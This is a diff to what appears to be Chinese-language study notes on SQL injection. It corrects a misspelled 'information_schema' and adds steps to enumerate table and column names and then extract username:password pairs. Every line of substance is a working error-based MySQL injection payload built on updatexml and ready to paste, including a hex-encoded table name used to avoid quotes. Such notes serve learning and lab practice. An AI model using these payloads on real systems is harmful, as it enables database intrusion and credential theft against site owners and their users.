@@ -379,19 +379,25 @@ sql源码
 
 `1' and updatexml(1,concat(0x7e,substr((select group_concat(schema_name) from information_schema.schemata),1,31)),1) and '1' = '1`
 
-(3) 查列表名
+(3) 查表名
 
 A. 一行一请求
 
-`1' and updatexml(1,concat(0x7e,substr((select table_name from information_shcema.tables where table_schema = database() limit 0,1),1,31),1),1) and '1' = '1`
+`1' and updatexml(1,concat(0x7e,substr((select table_name from information_schema.tables where table_schema = database() limit 0,1),1,31),1),1) and '1' = '1`
 
 B. 分段全拿
 
-`1' and updatexml(1,concat(0x7e,substr((select group_concat(table_name) from information_shcema.tables where table_schema = database()),1,31),1),1) and '1' = '1`
+`1' and updatexml(1,concat(0x7e,substr((select group_concat(table_name) from information_schema.tables where table_schema = database()),1,31),1),1) and '1' = '1`
 
+(4) 查列名(与(3)一样，都有AB两种方法，类比即可)
 
+`1' and updatexml(1,concat(0x7e,substr((select group_concat(column_name) from information_schema.columns where table_name = 0x7573657273),1,31),1),1) and '1' = '1`
 
+(0x7573657273 就是 users，用十六进制免去引号 用'users'效果一样)
 
+(5) 拿数据(与(3)一样，都有AB两种方法，类比即可)
+
+`1' and updatexml(1,concat(0x7e,substr((select group_concat(username,0x3a,password) from users),1,31),1),1) and '1' = '1`
 
 ## SQL数据库的补充知识
 一 基础字符部分
